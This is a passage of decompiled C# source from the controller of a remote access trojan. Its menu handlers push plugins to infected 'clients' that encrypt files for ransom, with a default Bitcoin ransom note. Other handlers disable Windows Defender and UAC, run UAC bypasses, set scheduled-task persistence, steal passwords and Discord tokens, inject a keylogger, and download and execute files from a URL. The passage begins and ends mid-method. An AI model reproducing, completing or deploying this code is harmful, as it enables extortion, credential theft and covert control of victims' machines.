				msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
				msgPack.ForcePathObject("Option").AsString = "stop";
				object lockReportWindowClients = Settings.LockReportWindowClients;
				lock (lockReportWindowClients)
				{
					foreach (Clients @object in Settings.ReportWindowClients)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000174 RID: 372 RVA: 0x000136DC File Offset: 0x000118DC
		private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "close";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000175 RID: 373 RVA: 0x000137A0 File Offset: 0x000119A0
		private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "restart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000176 RID: 374 RVA: 0x00013864 File Offset: 0x00011A64
		private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using (OpenFileDialog openFileDialog = new OpenFileDialog())
				{
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
						msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
						msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
						msgPack.ForcePathObject("Update").AsString = "true";
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						foreach (Clients clients in this.GetSelectedClients())
						{
							clients.LV.ForeColor = Color.Red;
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000177 RID: 375 RVA: 0x000139CC File Offset: 0x00011BCC
		private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "uninstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000178 RID: 376 RVA: 0x00013A90 File Offset: 0x00011C90
		private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				Clients[] selectedClients = this.GetSelectedClients();
				if (selectedClients.Length == 0)
				{
					Process.Start(Application.StartupPath);
				}
				else
				{
					foreach (Clients clients in selectedClients)
					{
						string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + clients.ID);
						if (Directory.Exists(text))
						{
							Process.Start(text);
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000179 RID: 377 RVA: 0x00013B18 File Offset: 0x00011D18
		private void RebootToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "restart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600017A RID: 378 RVA: 0x00013BF0 File Offset: 0x00011DF0
		private void ShutDownToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "shutdown";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600017B RID: 379 RVA: 0x00013CC8 File Offset: 0x00011EC8
		private void LogoutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "logoff";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600017C RID: 380 RVA: 0x00002B8F File Offset: 0x00000D8F
		private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.notifyIcon1.Dispose();
			Environment.Exit(0);
		}

		// Token: 0x0600017D RID: 381 RVA: 0x00013DA0 File Offset: 0x00011FA0
		private void FileSearchToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormFileSearcher formFileSearcher = new FormFileSearcher())
			{
				if (formFileSearcher.ShowDialog() == DialogResult.OK && this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileSearcher";
					msgPack.ForcePathObject("SizeLimit").AsInteger = (long)formFileSearcher.numericUpDown1.Value * 1000L * 1000L;
					msgPack.ForcePathObject("Extensions").AsString = formFileSearcher.txtExtnsions.Text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileSearcher.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						clients.LV.ForeColor = Color.Red;
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
		}

		// Token: 0x0600017E RID: 382 RVA: 0x00013EF0 File Offset: 0x000120F0
		private void InformationToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "information";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Information.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600017F RID: 383 RVA: 0x00013FC8 File Offset: 0x000121C8
		private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Message", "Message", "All your files have been encrypted. pay us 0.2 BITCOIN. Our address is 1234567890", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					if (this.listView1.SelectedItems.Count > 0)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "encrypt";
						msgPack.ForcePathObject("Message").AsString = text;
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ransomware.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						Clients[] selectedClients = this.GetSelectedClients();
						for (int i = 0; i < selectedClients.Length; i++)
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000180 RID: 384 RVA: 0x000140DC File Offset: 0x000122DC
		private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Password", "Password", "", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					if (this.listView1.SelectedItems.Count > 0)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "decrypt";
						msgPack.ForcePathObject("Password").AsString = text;
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ransomware.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						Clients[] selectedClients = this.GetSelectedClients();
						for (int i = 0; i < selectedClients.Length; i++)
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000181 RID: 385 RVA: 0x000141F0 File Offset: 0x000123F0
		private void DisableWDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0 && MessageBox.Show(this, "Only for Admin.", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text == "Admin")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000182 RID: 386 RVA: 0x00014314 File Offset: 0x00012514
		private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormAudio)Application.OpenForms["Audio Recorder:" + clients.ID] == null)
					{
						new FormAudio
						{
							Name = "Audio Recorder:" + clients.ID,
							Text = "Audio Recorder:" + clients.ID,
							F = this,
							ParentClient = clients,
							Client = clients
						}.Show();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000183 RID: 387 RVA: 0x000143C8 File Offset: 0x000125C8
		private void RunasToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "uac";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000184 RID: 388 RVA: 0x000144D0 File Offset: 0x000126D0
		private void SilentCleanupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000185 RID: 389 RVA: 0x000145D8 File Offset: 0x000127D8
		private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "schtaskinstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000186 RID: 390 RVA: 0x000146B0 File Offset: 0x000128B0
		private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Recovering...", Color.Black);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000187 RID: 391 RVA: 0x00014754 File Offset: 0x00012954
		private void DiscordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Discord.dll");
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Recovering Discord...", Color.Black);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000188 RID: 392 RVA: 0x000147F8 File Offset: 0x000129F8
		private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass3";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000189 RID: 393 RVA: 0x00014900 File Offset: 0x00012B00
		private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0 && MessageBox.Show(this, "Only for Admin.", "Disbale UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text == "Admin")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600018A RID: 394 RVA: 0x00014A24 File Offset: 0x00012C24
		private void CompMgmtLauncherToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass2";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600018B RID: 395 RVA: 0x00014B2C File Offset: 0x00012D2C
		private void autoKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Keylogger.exe")));
				msgPack.ForcePathObject("Inject").AsString = "";
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "Auto Keylogger:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
							{
								return;
							}
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				FormMain.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600018C RID: 396 RVA: 0x00014CFC File Offset: 0x00012EFC
		private void SchtaskUninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600018D RID: 397 RVA: 0x00014DD4 File Offset: 0x00012FD4
		private void fakeBinderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fakeBinder";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "FakeBinder: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					FormMain.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600018E RID: 398 RVA: 0x00014FCC File Offset: 0x000131CC
		private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Netstat.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormNetstat)Application.OpenForms["Netstat:" + clients.ID] == null)
					{
						new FormNetstat
						{
							Name = "Netstat:" + clients.ID,
							Text = "Netstat:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600018F RID: 399 RVA: 0x000150CC File Offset: 0x000132CC
		private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url", "", -1, -1);
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
					msgPack.ForcePathObject("url").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000190 RID: 400 RVA: 0x000151DC File Offset: 0x000133DC
		private void sendFileFromUrlToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url", "", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
					msgPack.ForcePathObject("url").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendFileFromUrl: " + Path.GetFileName(text);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					FormMain.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000191 RID: 401 RVA: 0x000153B8 File Offset: 0x000135B8
		private void installSchtaskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "autoschtaskinstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "InstallSchtask:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
							{
								return;
							}
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				FormMain.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
			}
			catch (Exception ex)
			{
